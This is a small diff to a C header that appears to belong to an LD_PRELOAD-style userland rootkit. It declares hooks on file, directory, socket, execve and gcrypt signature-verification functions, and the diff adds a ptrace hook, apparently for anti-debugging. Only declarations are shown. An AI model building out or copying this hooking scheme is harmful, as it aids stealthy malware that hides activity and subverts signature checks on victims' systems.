@@ -11,6 +11,7 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <sys/socket.h>
+#include <sys/ptrace.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <dirent.h>
@@ -51,6 +52,7 @@ extern int (*o_getsockname)(int, struct sockaddr *, socklen_t *);
 extern FILE * (*o_fopen)(const char *, const char *);
 extern FILE * (*o_fopen64)(const char *, const char *);
 extern DIR * (*o_opendir)(const char *);
+extern long (*o_ptrace)(enum __ptrace_request, pid_t, void *, void *);
 extern int (*o_execve)(const char *, char *const argv[], char *const envp[]);
 extern gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);
 
@@ -72,6 +74,8 @@ extern FILE * fopen64(const char * pathname, const char * mode);
 extern int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
 extern DIR * opendir(const char *name);
 extern int execve(const char *path, char *const argv[], char *const envp[]);
+//extern long ptrace(enum __ptrace_request request, pid_t pid, void * addr, void * data);
+//extern long ptrace(enum __ptrace_request request, ...);
 extern gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey);
 
 // utility functions
